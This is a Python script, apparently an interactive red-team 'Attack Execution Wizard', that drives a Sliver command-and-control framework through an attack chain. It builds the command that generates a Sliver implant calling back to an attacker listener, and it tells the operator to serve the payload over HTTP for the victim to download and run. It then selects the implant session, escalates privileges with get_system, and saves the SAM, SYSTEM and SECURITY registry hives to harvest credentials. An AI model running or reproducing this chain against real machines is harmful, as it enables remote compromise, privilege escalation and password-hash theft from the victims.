
import asyncio
import questionary
from rich.console import Console
from rich.prompt import Confirm
from rich.panel import Panel
from typing import Dict
console = Console()
user_params: Dict[str, str] = {}
def print_welcome_message():
    console.print(
        Panel(
            "[bold blink yellow]🎯 Welcome to Attack Execution Wizard[/]",
            title="[bold green]Hello[/]",
            subtitle="[bold blue]Let's Begin[/]",
            expand=False,
        )
    )
def print_finished_message(message="Command completed!😊", status="info"):
    console.print(f"[bold green][FINISHED][/bold green] {message}")
def confirm_action(prompt: str = "Keep going with the next attack step?") -> bool:
    styled_prompt = f"[bold bright_cyan]{prompt}[/]"
    return Confirm.ask(
        styled_prompt,
        default="y",
        choices=["y", "n"],
        show_default=False,
    )      
async def main():
    print_welcome_message()
    from attack_executor.config import load_config
    config = load_config(config_file_path="/home/kali/Desktop/Aurora-executor-demo/config.ini")
    from attack_executor.post_exploit.Sliver import SliverExecutor
    sliver_executor = SliverExecutor(config=config)

    async def executor_sliver_implant_generation():
        console.print(
            "[bold deep_sky_blue4]Generating the command to create a Sliver payload...[/bold deep_sky_blue4]"
        )

        # collect user input
        protocol = await questionary.select(
            "Select protocol", choices=["mtls", "http", "https"]
        ).ask_async()
        lhost = await questionary.text(
            "Enter listening address",
            default="192.168.146.129",
        ).ask_async()
        lport = await questionary.text(
            "Enter listening port",
            default="9001",
            validate=lambda x: x.isdigit() and 1 <= int(x) <= 65535 if x else False,
        ).ask_async()
        os_type = await questionary.select(
            "Select target OS",
            choices=["windows", "linux", "macos"],
        ).ask_async()
        arch = await questionary.select(
            "Select architecture",
            choices=["64bit", "32bit"],
        ).ask_async()
        save_path = await questionary.text(
            "Save path", default="/home/user/Downloads"
        ).ask_async()
        command = f"sliver generate --{protocol} {lhost}:{lport} --os {os_type} --arch {arch} --save {save_path}"
        console.print(
            f"[bold violet]Step: Commands to Generate Sliver Implant[/]", justify="left"
        )
        console.print(
            "─" * min(50, len("Commands to Generate Sliver Implant") + 10),
            style="dim violet",
        )
        console.print(f"[bold deep_sky_blue4]Commands to execute:[/]", justify="left")
        console.print(f"  [dim cyan]└─>[/] [pale_green3]{command}[/]")

        confirmed = confirm_action()
        if not confirmed:
            console.print(
                "Step canceled. Please ensure you have completed the manual steps."
            )
            return
    await executor_sliver_implant_generation()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the target payload file
        3. Download the payload file
        4. Execute the payload file to #{PATH}
        """)
    confirm_action()


    # Sliver-session selection
    console.print("[bold cyan]\n[Sliver Executor] Session Selection[/]")
    sliver_sessionid = await sliver_executor.select_sessions()

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 4 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: hosting_process[/]")
    console.print(f"  Description: Target process ID or name for privilege escalation")
    default_val = ""
    user_input = console.input(
        f"[bold]➤ Enter value for hosting_process [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: hosting_process")
    user_params["hosting_process"] = user_input

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 4 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: config[/]")
    console.print(f"  Description: Configuration options for escalation method")
    default_val = "Service"
    user_input = console.input(
        f"[bold]➤ Enter value for config [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: config")
    user_params["config"] = user_input

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: get_system[/]")
    confirm_action()
    try:
        await sliver_executor.get_system(user_params["hosting_process"], user_params["config"], user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    confirm_action()
    commands = """
    reg save HKLM\sam %temp%\sam
    reg save HKLM\system %temp%\system
    reg save HKLM\security %temp%\security

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

if __name__ == "__main__":
    asyncio.run(main())
